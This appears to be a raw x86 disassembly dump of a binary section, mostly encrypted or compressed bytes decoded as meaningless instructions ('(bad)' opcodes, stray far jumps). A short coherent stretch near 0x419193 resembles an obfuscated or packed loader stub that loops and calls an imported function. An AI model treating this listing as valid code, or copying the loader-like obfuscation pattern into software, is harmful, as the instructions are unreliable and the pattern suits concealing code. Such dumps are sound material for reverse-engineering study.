  418bcb:	xchg   ebx,eax
  418bcc:	xchg   edi,eax
  418bcd:	mov    ebp,0xef416308
  418bd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bd3:	int    0x3c
  418bd5:	sub    al,0x68
  418bd7:	les    esi,FWORD PTR [edi-0x77]
  418bda:	es test eax,0x3e5ae15a
  418be0:	mov    ecx,0xc7809bde
  418be5:	mov    al,ds:0xd84ba3e1
  418bea:	ins    DWORD PTR es:[edi],dx
  418beb:	cdq    
  418bec:	mov    ds:0x51eeffff,eax
  418bf1:	xchg   edx,eax
  418bf2:	xchg   esp,eax
  418bf3:	mov    ?,ecx
  418bf5:	pusha  
  418bf6:	jle    0x418c1e
  418bf8:	xlat   BYTE PTR ds:[ebx]
  418bf9:	mov    ebx,0x59b46e6b
  418bfe:	sahf   
  418bff:	frstor [edi]
  418c01:	out    dx,eax
  418c02:	push   ecx
  418c03:	pop    esi
  418c04:	jmp    0x7138aa5e
  418c09:	loopne 0x418ba5
  418c0b:	xlat   BYTE PTR gs:[ebx]
  418c0d:	sbb    DWORD PTR [ebx],esp
  418c0f:	xchg   edx,eax
  418c10:	pop    es
  418c11:	lahf   
  418c12:	xchg   esi,eax
  418c13:	inc    edi
  418c14:	mov    ds:0x3d512ff4,al
  418c19:	stc    
  418c1a:	mov    ?,edi
  418c1c:	or     BYTE PTR [esi+0x76],bl
  418c1f:	aam    0x7d
  418c21:	gs pop eax
  418c23:	loopne 0x418c82
  418c25:	sub    DWORD PTR [ebx-0x11],edi
  418c28:	xor    BYTE PTR [edi+eiz*8],dh
  418c2b:	sbb    al,BYTE PTR [ecx+ebp*1+0x46]
  418c2f:	aas    
  418c30:	imul   edi,DWORD PTR [edx+0x728d575a],0xfffffff0
  418c37:	pop    es
  418c38:	lds    eax,FWORD PTR [edx+eax*8+0x20767df]
  418c3f:	fcomp  QWORD PTR [edx-0x5]
  418c42:	shl    ch,1
  418c44:	push   cs
  418c45:	rcr    BYTE PTR ds:0xbc73ae11,0xfe
  418c4c:	or     DWORD PTR [ecx+0x4f246edf],eax
  418c52:	xchg   esp,eax
  418c53:	addr16 into 
  418c55:	inc    edi
  418c56:	mov    dl,0xe0
  418c58:	fbstp  TBYTE PTR [ebp+0x56]
  418c5b:	jnp    0x418c01
  418c5d:	data16 (bad) [ebx]
  418c60:	or     DWORD PTR [esi],0xffffff91
  418c63:	cs scas eax,DWORD PTR es:[edi]
  418c65:	lods   eax,DWORD PTR ds:[esi]
  418c66:	mov    ebx,0x37b98259
  418c6b:	xchg   ebx,eax
  418c6c:	jnp    0x418c5b
  418c6e:	adc    DWORD PTR [ebp-0x2bc0e14f],edi
  418c74:	cmp    ecx,edx
  418c76:	daa    
  418c77:	jbe    0x418c02
  418c79:	push   ebp
  418c7a:	or     al,0x9
  418c7c:	sbb    eax,0x42a395
  418c81:	jmp    0x419193
  418c86:	int    0x3d
  418c88:	cmp    eax,0xd5d7cdd7
  418c8d:	(bad)
  418c90:	not    al
  418c92:	pop    es
  418c93:	js     0x418cff
  418c95:	pop    esp
  418c96:	sbb    bl,ch
  418c98:	jg     0x418d12
  418c9a:	jae    0x418d18
  418c9c:	js     0x418d16
  418c9e:	cmp    DWORD PTR [ebx],ebx
  418ca0:	test   al,0x8c
  418ca2:	es addr16 call 0xd9a527d6
  418ca9:	xchg   ecx,eax
  418caa:	or     cl,bh
  418cac:	jb     0x418d25
  418cae:	sub    eax,0x5972e70e
  418cb3:	inc    edx
  418cb4:	mov    al,ds:0xa6741b9d
  418cb9:	out    dx,eax
  418cba:	cmc    
  418cbb:	push   eax
  418cbc:	fist   WORD PTR [edx]
  418cbe:	or     al,dh
  418cc0:	in     al,dx
  418cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cc2:	sub    edx,DWORD PTR [edi]
  418cc4:	dec    edi
  418cc5:	shl    BYTE PTR [eax+eax*8],0x1b
  418cc9:	dec    ecx
  418cca:	outs   dx,BYTE PTR ds:[esi]
  418ccb:	mov    ah,0xcc
  418ccd:	push   0xffffff9e
  418ccf:	pushf  
  418cd0:	xor    ecx,ecx
  418cd2:	lahf   
  418cd3:	dec    edx
  418cd4:	lock sbb DWORD PTR [eax-0x58],edi
  418cd8:	cmp    BYTE PTR [ebx-0x7f8386a6],ch
  418cde:	mov    al,0x3e
  418ce0:	adc    eax,0xe3e19b98
  418ce5:	repz pop ebp
  418ce7:	push   ebx
  418ce8:	mov    WORD PTR [ebx-0x4c],gs
  418ceb:	sub    eax,0xb1a463ef
  418cf0:	inc    esi
  418cf1:	xchg   esp,eax
  418cf2:	cmp    DWORD PTR [ebx-0x6b527a8f],esp
  418cf8:	stc    
  418cf9:	sub    al,0xc3
  418cfb:	mov    bh,0x31
  418cfd:	cmp    DWORD PTR [edi+0x3ec3c10c],esp
  418d03:	fiadd  WORD PTR ds:0x430e0aeb
  418d09:	rcr    bl,cl
  418d0b:	hlt    
  418d0c:	mov    cs,eax
  418d0e:	mov    bl,0xac
  418d10:	mov    dh,0xde
  418d12:	mov    cl,0xfc
  418d14:	call   FWORD PTR [edi]
  418d16:	ror    BYTE PTR [esi-0x31],1
  418d19:	lods   eax,DWORD PTR ds:[esi]
  418d1a:	jg     0x418cd4
  418d1c:	xchg   DWORD PTR ds:0x71a75732,eax
  418d22:	nop
  418d23:	lahf   
  418d24:	shr    BYTE PTR [ebp-0x71],0x3
  418d28:	jno    0x418d8b
  418d2a:	pop    es
  418d2b:	cdq    
  418d2c:	scas   al,BYTE PTR es:[edi]
  418d2d:	jb     0x418d06
  418d2f:	xor    BYTE PTR [eax],dh
  418d31:	dec    ecx
  418d32:	xor    esp,DWORD PTR [ebx+0x2d]
  418d35:	enter  0x47b,0x51
  418d39:	enter  0x2351,0x3c
  418d3d:	lea    eax,[esi]
  418d3f:	adc    eax,0xcab653dd
  418d44:	mov    al,BYTE PTR [esi]
  418d46:	jmp    0x72d2:0x55282f18
  418d4d:	cmp    dh,BYTE PTR [ecx+0x2a]
  418d50:	cmp    bh,BYTE PTR [edx+0x71]
  418d53:	rol    DWORD PTR [eax-0x7806d957],0xfd
  418d5a:	es out 0xfb,eax
  418d5d:	push   0xe109aa76
  418d62:	cs adc ah,bh
  418d65:	sub    dl,BYTE PTR [ecx]
  418d67:	pop    ebp
  418d68:	or     al,0xc6
  418d6a:	jmp    0x418d10
  418d6c:	cmp    eax,0x1c6df333
  418d71:	inc    edx
  418d72:	pop    ecx
  418d73:	fwait
  418d74:	and    al,0xf7
  418d76:	mov    ecx,esp
  418d78:	int    0xb8
  418d7a:	push   0x3b73cda4
  418d7f:	mov    eax,ds:0x8ef6d5be
  418d84:	pop    ds
  418d85:	div    DWORD PTR [edx]
  418d87:	adc    al,BYTE PTR [edx+eax*1]
  418d8a:	hlt    
  418d8b:	jle    0x418db4
  418d8d:	push   0xffffff9f
  418d8f:	and    edx,DWORD PTR [ecx+0x75aaee17]
  418d95:	xchg   edx,eax
  418d96:	jmp    0x2db3af46
  418d9b:	inc    cx
  418d9d:	xchg   esp,eax
  418d9e:	mov    WORD PTR [edx],ds
  418da0:	push   ecx
  418da1:	(bad)  
  418da2:	test   eax,0xdbd9700
  418da7:	xchg   esp,eax
  418da8:	cmp    eax,0x2dc4c730
  418dad:	xor    BYTE PTR [ebp-0x6b937923],dl
  418db3:	add    eax,0x63d44c67
  418db8:	sbb    esi,DWORD PTR ds:0x5919
  418dbd:	(bad)  
  418dbe:	pop    ds
  418dbf:	not    dl
  418dc1:	dec    esi
  418dc2:	stos   BYTE PTR es:[edi],al
  418dc3:	clc    
  418dc4:	(bad)  
  418dc5:	cmp    eax,DWORD PTR [edx-0x7a]
  418dc8:	rcl    BYTE PTR [ecx+0x7347d57c],0x25
  418dcf:	push   edx
  418dd0:	cmp    DWORD PTR [ecx],edx
  418dd2:	sti    
  418dd3:	es mov cl,0xe9
  418dd6:	jg     0x418d60
  418dd8:	neg    DWORD PTR [edx+esi*1-0x40]
  418ddc:	sbb    al,BYTE PTR [edi+ebp*2]
  418ddf:	aam    0xf2
  418de1:	aam    0xed
  418de3:	clc    
  418de4:	sub    eax,0x495bc026
  418de9:	jbe    0x418d7c
  418deb:	(bad)  
  418dec:	mov    edx,0xa792ae87
  418df1:	cmp    BYTE PTR [edi+ebx*2],dl
  418df4:	aad    0x79
  418df6:	loope  0x418e2f
  418df8:	dec    esp
  418df9:	(bad)  
  418dfa:	in     al,0xa
  418dfc:	stc    
  418dfd:	into   
  418dfe:	adc    eax,DWORD PTR [edi+0x7cf85495]
  418e04:	ss clc 
  418e06:	or     edi,edi
  418e08:	mov    ebx,0xbdcad03f
  418e0d:	push   es
  418e0e:	adc    al,0x2c
  418e10:	cdq    
  418e11:	or     ch,BYTE PTR [esi+0x3d]
  418e14:	inc    ebp
  418e15:	jg     0x418e7e
  418e17:	(bad)  
  418e18:	jge    0x418e70
  418e1a:	hlt    
  418e1b:	(bad)  
  418e1c:	mov    WORD PTR ss:0x2de88194,fs
  418e23:	aam    0x5f
  418e25:	(bad)  
  418e26:	jns    0x418dd1
  418e28:	or     edi,esp
  418e2a:	sti    
  418e2b:	popa   
  418e2c:	and    al,0xd4
  418e2e:	xor    ebx,DWORD PTR [esp+ecx*1+0x3c]
  418e32:	mov    BYTE PTR [ebp-0x917b9f0],bh
  418e38:	rcl    DWORD PTR [edx-0x67],0xa7
  418e3c:	retf   
  418e3d:	leave  
  418e3e:	lahf   
  418e3f:	les    ebp,FWORD PTR [eax+0x6f22275e]
  418e45:	sub    eax,0x25a219ac
  418e4a:	mov    esi,0x7d6a53f4
  418e4f:	test   BYTE PTR [eax],0x8f
  418e52:	push   eax
  418e53:	mov    DWORD PTR [edi+0x673fed6f],edx
  418e59:	xchg   esp,eax
  418e5a:	sbb    al,0xd6
  418e5c:	mov    edi,0xf4f22c14
  418e61:	cmp    eax,0xc255b1e8
  418e66:	xor    eax,0xcb2b103f
  418e6b:	mov    DWORD PTR [esi-0x6d],0x80cefa64
  418e72:	adc    DWORD PTR [ecx+0x75],esp
  418e75:	test   esi,edi
  418e77:	jle    0x418ec7
  418e79:	out    dx,eax
  418e7a:	sbb    eax,0x5804895e
  418e7f:	sub    ch,BYTE PTR [ecx]
  418e81:	sbb    ch,BYTE PTR [ecx-0x45]
  418e84:	mov    ch,0xb5
  418e86:	jl     0x418e8f
  418e88:	push   esp
  418e89:	loop   0x418ef2
  418e8b:	loop   0x418e89
  418e8d:	adc    dl,BYTE PTR [eax]
  418e8f:	xor    bl,BYTE PTR [esi*1+0x2269d724]
  418e96:	in     eax,dx
  418e97:	jne    0x418ee1
  418e99:	mov    ch,0xe5
  418e9b:	in     eax,0xc8
  418e9d:	aam    0xf9
  418e9f:	push   esi
  418ea0:	jo     0x418f08
  418ea2:	int    0x17
  418ea4:	push   ds
  418ea5:	cs jge 0x418e73
  418ea8:	test   al,0x5b
  418eaa:	mov    BYTE PTR [ebx+0x51a9f68d],ah
  418eb0:	call   0x58615959
  418eb5:	xchg   ebx,eax
  418eb6:	or     edi,DWORD PTR [ebx]
  418eb8:	cmp    al,0x7c
  418eba:	cmp    eax,0x51ea972a
  418ebf:	pop    es
  418ec0:	idiv   DWORD PTR [esi+0x5bfeb7bc]
  418ec6:	mov    esi,0x46b51ad8
  418ecb:	pop    edx
  418ecc:	push   es
  418ecd:	sbb    DWORD PTR [ecx-0x52577dc1],eax
  418ed3:	enter  0xca9,0xf9
  418ed7:	xchg   esp,eax
  418ed8:	fld    QWORD PTR [ecx+0x57ff3b2f]
  418ede:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418edf:	and    DWORD PTR [esi-0x7032f63b],eax
  418ee5:	jmp    0x418f20
  418ee7:	pop    edx
  418ee8:	push   ebp
  418ee9:	jne    0x418f29
  418eeb:	out    dx,al
  418eec:	imul   edx,DWORD PTR [edi+0x38],0xffffff8e
  418ef0:	sub    eax,0xebebcd12
  418ef5:	add    al,0x56
  418ef7:	mov    cs,WORD PTR [edx]
  418ef9:	push   ds
  418efa:	data16 repz jbe 0x418f6b
  418efe:	and    BYTE PTR [eax+0x2e],bl
  418f01:	pop    edi
  418f02:	pop    edx
  418f03:	pusha  
  418f04:	fnstcw WORD PTR cs:[esi]
  418f07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f08:	mov    ebp,0xbaa7cbb4
  418f0d:	fdivr  QWORD PTR [esi-0x2d]
  418f10:	es push ebx
  418f12:	xchg   DWORD PTR [edi],ecx
  418f14:	cmp    BYTE PTR [ebx-0x662fbf3d],bl
  418f1a:	and    ah,BYTE PTR [esi]
  418f1c:	hlt    
  418f1d:	mov    al,0xe4
  418f1f:	and    al,0xd9
  418f21:	repz (bad) 
  418f23:	lods   eax,DWORD PTR ds:[esi]
  418f24:	sbb    DWORD PTR [edx+0x5],0x65
  418f28:	xor    bl,bh
  418f2a:	sub    BYTE PTR [edx+0x6b2378de],ch
  418f30:	xor    DWORD PTR [esi+ebp*8],eax
  418f33:	adc    DWORD PTR [edi+0x43],ebx
  418f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f37:	(bad)  
  418f38:	aad    0xa2
  418f3a:	dec    ebx
  418f3b:	sahf   
  418f3c:	xor    al,0x17
  418f3e:	stos   BYTE PTR es:[edi],al
  418f3f:	fwait
  418f40:	or     DWORD PTR [ecx-0x26],0x1f7bd43b
  418f47:	enter  0xbe77,0xb7
  418f4b:	popf   
  418f4c:	xchg   ebp,eax
  418f4d:	(bad)  
  418f4e:	imul   ebx,edi,0x7d
  418f51:	inc    ecx
  418f52:	out    0xc6,eax
  418f54:	loop   0x418fc6
  418f56:	popf   
  418f57:	adc    eax,0xcc12e200
  418f5c:	xor    eax,0x4e36c0a7
  418f61:	mov    ch,BYTE PTR [ecx-0x2d]
  418f64:	fwait
  418f65:	test   esi,edx
  418f67:	add    DWORD PTR [ebp+0x48],esi
  418f6a:	pop    ebp
  418f6b:	lods   eax,DWORD PTR ds:[esi]
  418f6c:	mov    ebx,0xcb44041a
  418f71:	fisub  WORD PTR [edx]
  418f73:	cmp    dh,BYTE PTR [esi+0x7060f0ef]
  418f79:	mov    ch,0x76
  418f7b:	(bad)  
  418f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f7d:	push   esi
  418f7e:	jae    0x418f3f
  418f80:	xchg   edi,eax
  418f81:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  418f83:	xlat   BYTE PTR ds:[ebx]
  418f84:	pop    eax
  418f85:	xchg   ecx,eax
  418f86:	mov    edi,ebx
  418f88:	leave  
  418f89:	xchg   edx,eax
  418f8a:	sub    BYTE PTR [eax],bl
  418f8c:	rcr    cl,1
  418f8e:	hlt    
  418f8f:	aaa    
  418f90:	rcl    BYTE PTR [ebx+edx*1],0xa1
  418f94:	in     eax,dx
  418f95:	popf   
  418f96:	sub    bl,al
  418f98:	not    DWORD PTR ds:0xc0b6a3c
  418f9e:	adc    eax,0xb6a7a895
  418fa3:	aaa    
  418fa4:	xor    BYTE PTR [eax+0x3b613a4e],bh
  418faa:	repnz test ah,0xb7
  418fae:	add    bh,BYTE PTR [esi]
  418fb0:	jp     0x418fd2
  418fb2:	popa   
  418fb3:	fstp   DWORD PTR [edx]
  418fb5:	push   ebp
  418fb6:	push   eax
  418fb7:	jns    0x418fe9
  418fb9:	mov    BYTE PTR [ebx-0x2d],bh
  418fbc:	outs   dx,DWORD PTR ds:[esi]
  418fbd:	or     bl,BYTE PTR [edi+0x11]
  418fc0:	jg     0x418f81
  418fc2:	xor    ebp,ecx
  418fc4:	ja     0x418f58
  418fc6:	fs retf 
  418fc8:	push   ss
  418fc9:	enter  0xd637,0x9e
  418fcd:	(bad)  [eax+0x7d]
  418fd0:	jp     0x418f97
  418fd2:	inc    eax
  418fd3:	fstp   TBYTE PTR [ecx]
  418fd5:	std    
  418fd6:	lds    edi,FWORD PTR [edx+0x39]
  418fd9:	aas    
  418fda:	nop
  418fdb:	adc    ch,BYTE PTR [eax-0x7702c194]
  418fe1:	inc    eax
  418fe2:	rcl    ch,1
  418fe4:	xlat   BYTE PTR ds:[ebx]
  418fe5:	cmp    al,0xe2
  418fe7:	sbb    eax,0x615f592c
  418fec:	sti    
  418fed:	sbb    BYTE PTR [edx+0x3a1b944b],bh
  418ff3:	stos   DWORD PTR es:[edi],eax
  418ff4:	cmc    
  418ff5:	push   ss
  418ff6:	jns    0x419046
  418ff8:	call   0x76a6:0x8f0aed05
  418fff:	and    al,0xd3
  419001:	(bad)  
  419002:	mov    esi,0xa7a0daae
  419007:	and    eax,0xebe7c3b3
  41900c:	(bad)  
  41900d:	mov    al,ds:0x757856fb
  419012:	cmp    DWORD PTR [edx],0x9
  419015:	jne    0x41903a
  419017:	aam    0xc9
  419019:	xchg   DWORD PTR [edx],edi
  41901b:	icebp  
  41901c:	std    
  41901d:	add    al,0x96
  41901f:	aam    0x5b
  419021:	fs inc ebx
  419023:	gs jno 0x418fe7
  419026:	loopne 0x41905e
  419028:	push   cs
  419029:	mov    bl,0x3d
  41902b:	push   edi
  41902c:	shl    DWORD PTR ds:0xaf08c720,0xf8
  419033:	adc    BYTE PTR [edx+0xa],0x5
  419037:	cmp    esp,DWORD PTR [ecx-0x47036496]
  41903d:	sahf   
  41903e:	and    al,0x42
  419040:	or     ebp,DWORD PTR [ecx-0x23d5f68b]
  419046:	clc    
  419047:	inc    edi
  419048:	sub    ebp,DWORD PTR [ebx-0x6d]
  41904b:	test   eax,0xeccab766
  419050:	mov    eax,0xd4659375
  419055:	jmp    0x41900b
  419057:	cmc    
  419058:	hlt    
  419059:	(bad)  
  41905a:	mov    esp,0xaf2135c7
  41905f:	mov    al,ds:0x25f442d
  419064:	jg     0x419083
  419066:	inc    esp
  419067:	lea    ebx,ds:0x47b4b955
  41906d:	cmp    DWORD PTR [edx],eax
  41906f:	iret   
  419070:	add    BYTE PTR [ecx+0x61],cl
  419073:	ds mov ch,0xef
  419076:	cwde   
  419077:	adc    BYTE PTR [esi-0x4d88df21],0x7b
  41907e:	jmp    FWORD PTR [ecx+0x72]
  419081:	aad    0x5e
  419083:	daa    
  419084:	xor    bh,cl
  419086:	shr    DWORD PTR ds:0xa81ed462,0x77
  41908d:	mov    ?,WORD PTR [edx-0x55]
  419090:	xchg   ebx,eax
  419091:	push   edx
  419092:	dec    edx
  419093:	ds xor eax,0xb0f97802
  419099:	(bad)  
  41909a:	cmp    eax,0xc187731
  41909f:	jge    0x4190d3
  4190a1:	inc    esp
  4190a2:	ja     0x4190bb
  4190a4:	ss add eax,0xbdc0bc8e
  4190aa:	add    eax,DWORD PTR [edx+0x5b7d074f]
  4190b0:	cdq    
  4190b1:	xor    cl,ch
  4190b3:	add    BYTE PTR [ecx-0x25],bh
  4190b6:	outs   dx,DWORD PTR ds:[esi]
  4190b7:	ds jmp 0xede1:0xa279629
  4190bf:	mov    al,ds:0x8c1df0cc
  4190c4:	mov    ebp,DWORD PTR [esi+0xb51e78d]
  4190ca:	or     DWORD PTR [esi+eax*1+0x39c99033],ecx
  4190d1:	mov    ecx,DWORD PTR [edi+0x75c0df91]
  4190d7:	repnz cmp dl,ch
  4190da:	aad    0x16
  4190dc:	test   DWORD PTR [edi],ebx
  4190de:	sbb    edx,edx
  4190e0:	add    ebp,DWORD PTR [edi+0x39]
  4190e3:	push   ebx
  4190e4:	sub    al,0x2e
  4190e6:	out    dx,eax
  4190e7:	dec    eax
  4190e8:	stos   DWORD PTR es:[edi],eax
  4190e9:	or     edi,DWORD PTR [ebx-0x1b]
  4190ec:	out    0xe2,eax
  4190ee:	adc    eax,0x49dba141
  4190f3:	cmp    BYTE PTR [eax-0x69],al
  4190f6:	mov    ebx,0x9734044f
  4190fb:	les    edi,FWORD PTR [esp+ebp*4+0x42]
  4190ff:	jnp    0x4190de
  419101:	stos   DWORD PTR es:[edi],eax
  419102:	rcr    BYTE PTR [ebx+0x57],1
  419105:	fstp   QWORD PTR [ecx+0x3cb9e174]
  41910b:	fsubr  QWORD PTR [esi+0x7a]
  41910e:	add    ecx,DWORD PTR [ebx]
  419110:	mov    esp,0x519e690e
  419115:	pop    ebp
  419116:	mov    edx,es
  419118:	jmp    0x5ca4:0x84cf2c4e
  41911f:	aam    0xbf
  419121:	arpl   bx,sp
  419123:	aam    0x6a
  419125:	push   ebx
  419126:	push   ebp
  419127:	int    0xbb
  419129:	mov    dl,0xdd
  41912b:	add    DWORD PTR [ebx],ebx
  41912d:	mov    BYTE PTR [edx+0x6b],bl
  419130:	jns    0x419168
  419132:	std    
  419133:	adc    ah,dh
  419135:	cmp    BYTE PTR [ecx-0x50],al
  419138:	sbb    DWORD PTR [ebp-0x23],ebx
  41913b:	jns    0x4191a0
  41913d:	imul   esi,DWORD PTR [edi+0xa3180a4],0x16
  419144:	int    0xbe
  419146:	loope  0x419128
  419148:	in     eax,dx
  419149:	fwait
  41914a:	out    dx,al
  41914b:	ror    esp,1
  41914d:	stos   DWORD PTR es:[edi],eax
  41914e:	xor    eax,0x531e4b48
  419153:	lahf   
  419154:	jo     0x4190df
  419156:	mov    bh,0x73
  419158:	retf   0x76b2
  41915b:	and    bh,BYTE PTR [edi-0x2d]
  41915e:	sti    
  41915f:	pushf  
  419160:	test   DWORD PTR [esi+0x1ce914b3],esi
  419166:	repnz xchg edx,eax
  419168:	popf   
  419169:	icebp  
  41916a:	or     al,0xd6
  41916c:	inc    edi
  41916d:	sub    DWORD PTR [ecx+0x52],ecx
  419170:	or     bl,BYTE PTR [edx]
  419172:	push   ebx
  419173:	push   ebx
  419174:	test   al,0xce
  419176:	adc    eax,0x2c5ac217
  41917b:	and    BYTE PTR [edi-0x19],0x38
  41917f:	or     bl,dl
  419181:	inc    esp
  419182:	test   BYTE PTR [edx+0x4caf21b2],bh
  419188:	pop    esi
  419189:	fdiv   QWORD PTR [esi-0x62]
  41918c:	and    ebp,eax
  41918e:	mov    al,ds:0x6d30f46b
  419193:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  41919a:	adc    DWORD PTR ds:0x42a35d,0x11fe
  4191a4:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  4191ab:	sbb    edi,0x48d3
  4191b1:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  4191b8:	and    DWORD PTR ds:0x42a319,0x0
  4191c2:	mov    edx,DWORD PTR ds:0x42a319
  4191c8:	inc    edx
  4191c9:	mov    DWORD PTR ds:0x42a319,edx
  4191cf:	cmp    DWORD PTR ds:0x42a319,0x1c
  4191d6:	jne    0x4191f6
  4191dc:	push   0x42a2b9
  4191e1:	push   0x39c2
  4191e6:	push   0x8f9d
  4191eb:	push   0x3fa2
  4191f0:	call   DWORD PTR ds:0x425354
  4191f6:	cmp    DWORD PTR ds:0x42a319,0x12
  4191fd:	jb     0x4191c2
  419203:	xor    edx,edx
  419205:	xor    edx,DWORD PTR ds:0x42a311
  41920b:	add    DWORD PTR ds:0x42a2c9,edx
  419211:	jmp    0x419723
  419216:	retf   
  419217:	ret    
  419218:	ds ret 
  41921a:	mov    cl,0xc9
  41921d:	retf   
  41921e:	xadd   esp,eax
  419221:	xor    BYTE PTR [esi+0x1],al
  419224:	sbb    eax,DWORD PTR [edi+0x787fee13]
  41922a:	jae    0x4192a8
  41922c:	js     0x4192a6
  41922e:	ret    0x32bb
  419231:	pop    esp
  419232:	or     BYTE PTR [ebx+0x10],bl
  419235:	inc    esp
  419236:	fild   QWORD PTR [edx]
  419238:	sbb    edi,DWORD PTR [edi]
  41923a:	xchg   ebx,eax
  41923b:	mov    esi,0x8302de6c
  419240:	push   edi
  419241:	sub    al,0x33
  419243:	out    0x19,eax
  419245:	sbb    eax,DWORD PTR [ebx+0x52419f6d]
  41924b:	je     0x4192c9
  41924d:	addr16 mov ch,0xc5
  419250:	or     eax,esi
  419252:	inc    ebx
  419253:	adc    esp,esi
  419255:	push   ebx
  419256:	out    dx,al
  419257:	jmp    0x41920d
  419259:	inc    esp
  41925b:	mov    cs,WORD PTR [eax]
  41925d:	sub    edx,edi
  41925f:	sub    ch,dl
  419261:	inc    edx
  419262:	bound  esp,QWORD PTR [ebx]
  419264:	arpl   WORD PTR [eax-0x658bbe47],bp
  41926a:	imul   edx,ebp,0xffffffcd
  41926d:	sar    DWORD PTR [ecx+0x3df3e4d9],1
  419273:	cld    
  419274:	xchg   ebp,eax
  419275:	(bad)
  419278:	int    0x16
  41927a:	lods   al,BYTE PTR ds:[esi]
  41927b:	jnp    0x419247
  41927d:	or     DWORD PTR [ebp-0x7c],esi
  419280:	mov    bh,0xe1
  419282:	push   ss
  419283:	push   edi
  419284:	test   al,0x5d
  419286:	push   ecx
  419287:	neg    BYTE PTR [ebx+0x6248d504]
  41928d:	js     0x4192e4
  41928f:	stc    
  419290:	rcr    BYTE PTR [edx],0x52
  419293:	leave  
  419294:	adc    eax,0x7beb5324
  419299:	sbb    BYTE PTR [edx],0xe2
  41929c:	push   es
  41929d:	inc    eax
  41929e:	add    BYTE PTR ds:0xac5930c8,ah
  4192a4:	push   es
  4192a5:	rcl    DWORD PTR [edi+0x797068e4],0xbd
  4192ac:	adc    eax,0x11069cbe
  4192b1:	lods   al,BYTE PTR ds:[esi]
  4192b2:	and    al,0x15
  4192b4:	adc    al,0x38
  4192b6:	cmp    ebp,edx
  4192b8:	outs   dx,DWORD PTR ds:[esi]
  4192b9:	jo     0x41928f
  4192bb:	mov    DWORD PTR [ecx-0x48],esp
  4192be:	addr16 sti 
  4192c0:	sub    DWORD PTR [eax+0x7f130e03],ebp
  4192c6:	shl    BYTE PTR [ebx-0x13],0x62
  4192ca:	cli    
  4192cb:	xchg   ecx,eax
  4192cc:	push   edx
  4192cd:	lea    esi,[eax]
  4192cf:	scas   eax,DWORD PTR es:[edi]
  4192d0:	fwait
  4192d1:	adc    eax,0x124361d
  4192d6:	out    0xc2,eax
  4192d8:	imul   edx,DWORD PTR [edx],0x626cfd78
  4192de:	cmp    al,0xc3
  4192e0:	push   esp
  4192e1:	mov    ebp,0xaeeb03c1
  4192e6:	and    eax,0x4df9af45
  4192eb:	push   ds
  4192ec:	shl    DWORD PTR [edi-0x4d7bc201],cl
  4192f2:	stos   DWORD PTR es:[edi],eax
  4192f3:	cdq    
  4192f4:	pop    edx
  4192f5:	aaa    
  4192f6:	mov    al,0x6
  4192f8:	and    al,0x7c
  4192fa:	mov    esi,0x7ceea672
  4192ff:	fwait
  419300:	mov    edi,0x72994bf5
  419305:	dec    esi
  419306:	cld    
  419307:	(bad)  
  419308:	icebp  
  419309:	adc    BYTE PTR [ebp+0x70e7e55b],dl
  41930f:	add    ch,bl
  419311:	sub    eax,0xfd895816
  419316:	repz int 0xec
  419319:	rcr    DWORD PTR [esi+0x1ac5970d],0x65
  419320:	mov    ah,0x8a
  419322:	cli    
  419323:	mov    ds:0xb57e0b63,al
  419328:	and    BYTE PTR [ecx+eax*4-0x34],al
  41932c:	xor    ebx,DWORD PTR [esi+0x5961601c]
  419332:	mov    ah,BYTE PTR [esi+0x2f]
  419335:	loop   0x4192f0
  419337:	lods   eax,DWORD PTR ds:[esi]
  419338:	mov    ecx,0x4e1b3dad
  41933d:	ret    
  41933e:	fxch   st(0)
  419340:	xor    DWORD PTR [ebx-0x1c],esp
  419343:	xor    bh,BYTE PTR [ebx]
  419345:	repz sub eax,0xb966426c
  41934b:	adc    al,0x71
  41934d:	icebp  
  41934e:	rcr    ch,0xad
  419351:	into   
  419352:	xchg   ebp,eax
  419353:	xchg   DWORD PTR [edi+0x57],edx
  419356:	and    DWORD PTR [edi+0x4],0x62d59417
  41935d:	out    0x51,eax
  41935f:	repz mov edx,0xc83ccdc0
  419365:	mov    edx,0xb042c7b5
  41936a:	cmp    ecx,DWORD PTR [ebx+0x2c]
  41936d:	das    
  41936e:	mov    cl,0xb9
  419370:	(bad)  
  419371:	icebp  
  419372:	in     eax,0xe4
  419374:	jecxz  0x41933a
  419376:	cmp    ch,BYTE PTR [di-0x20]
  41937a:	dec    edx
  41937b:	lods   eax,DWORD PTR ds:[esi]
  41937c:	stos   BYTE PTR es:[edi],al
  41937d:	into   
  41937e:	pop    ecx
  41937f:	loope  0x419398
  419381:	lock adc DWORD PTR [ebp+0x2e],0xffffffe8
  419386:	mov    ebp,DWORD PTR [eax-0x21b32d8]
  41938c:	push   0x441441c1
  419391:	sahf   
  419392:	adc    cl,dl
  419394:	sbb    dh,BYTE PTR [ecx-0x438e5b66]
  41939a:	cmp    al,0x94
  41939c:	mov    ds:0x1276edd,al
  4193a1:	mov    ds:0x91e0287f,eax
  4193a6:	xlat   BYTE PTR ds:[ebx]
  4193a7:	outs   dx,DWORD PTR ds:[esi]
  4193a8:	imul   esi,ebx,0xf45717ff
  4193ae:	stos   BYTE PTR es:[edi],al
  4193af:	jecxz  0x41940a
  4193b1:	lahf   
  4193b2:	out    dx,al
  4193b3:	popf   
  4193b4:	add    esp,DWORD PTR [ebx-0x70fe690e]
  4193ba:	pop    ecx
  4193bb:	add    DWORD PTR ds:[ecx+0x1794e98d],esi
  4193c2:	pop    ebp
  4193c3:	cld    
  4193c4:	cld    
  4193c5:	adc    al,0x72
  4193c7:	(bad)  
  4193c8:	inc    esi
  4193c9:	retf   0x708
  4193cc:	xchg   BYTE PTR ds:0x97bddd23,bl
  4193d2:	dec    ecx
  4193d3:	sar    DWORD PTR [esi],0xaa
  4193d6:	xchg   esp,eax
  4193d7:	pushf  
  4193d8:	xor    ebx,DWORD PTR [edi+edx*1+0x4a]
  4193dc:	sub    eax,0xe2802871
  4193e1:	fwait
  4193e2:	adc    DWORD PTR [edx],esp
  4193e4:	icebp  
  4193e5:	dec    ecx
  4193e6:	push   ebx
  4193e7:	inc    edx
